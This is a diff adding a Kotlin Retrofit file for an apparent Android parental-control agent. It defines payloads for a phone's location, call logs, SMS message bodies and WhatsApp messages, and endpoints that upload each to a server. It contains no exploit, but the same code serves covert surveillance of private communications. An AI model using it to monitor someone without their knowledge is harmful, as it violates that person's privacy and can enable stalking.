@@ -1,0 +1,52 @@
+package com.parentalcontrol.agent.network
+
+import retrofit2.Response
+import retrofit2.http.Body
+import retrofit2.http.POST
+
+// ---------- Payloads ----------
+
+data class LocationPayload(
+    val latitude: Double,
+    val longitude: Double,
+    val accuracy: Float,
+    val timestamp: Long
+)
+
+data class CallLogEntry(
+    val number: String,
+    val type: Int,       // 1=Incoming, 2=Outgoing, 3=Missed
+    val date: Long,
+    val duration: Long,
+    val name: String
+)
+
+data class SmsEntry(
+    val address: String,
+    val body: String,
+    val date: Long,
+    val type: Int        // 1=Inbox, 2=Sent
+)
+
+data class WhatsAppMessagePayload(
+    val sender: String,
+    val message: String,
+    val timestamp: Long
+)
+
+// ---------- Service ----------
+
+interface ApiService {
+
+    @POST("agent/location")
+    suspend fun sendLocation(@Body payload: LocationPayload): Response<Unit>
+
+    @POST("agent/calls")
+    suspend fun sendCallLogs(@Body entries: List<CallLogEntry>): Response<Unit>
+
+    @POST("agent/sms")
+    suspend fun sendSmsLogs(@Body entries: List<SmsEntry>): Response<Unit>
+
+    @POST("agent/whatsapp")
+    suspend fun sendWhatsAppMessage(@Body payload: WhatsAppMessagePayload): Response<Unit>
+}
